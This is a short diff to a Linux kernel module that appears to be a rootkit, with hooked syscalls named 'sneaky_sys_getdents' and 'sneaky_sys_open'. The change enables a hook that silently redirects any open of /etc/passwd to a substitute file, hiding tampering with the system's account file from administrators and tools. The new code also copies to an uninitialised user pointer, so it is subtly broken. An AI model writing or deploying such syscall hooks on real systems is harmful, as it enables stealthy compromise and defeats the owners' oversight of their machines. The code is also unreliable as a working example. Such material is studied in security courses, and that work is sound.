@@ -86,15 +86,16 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd, struct linux_dirent __user 
 }
 
 asmlinkage long sneaky_sys_open(const char *filename, int flags, int mode) {
-  /*
+  
   if (strcmp(filename, etc_passwd) == 0 )
   {
-    return (*original_open)(tmp_passwd, flags, mode);
+    void __user* to;
+    copy_to_user(to, tmp_passwd , (unsigned)strlen(tmp_passwd) + 1 );
+    return (*original_open)( (const char *)to, flags, mode);
+    
   } else {
     return (*original_open)(filename, flags, mode);
-  }*/
-  printk(KERN_INFO "filepath = %s, flags = %d, mode = %d\n", filename, flags, mode);
-  return (*original_open)(filename, flags, mode);
+  }
 }
 /*
 asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count) {
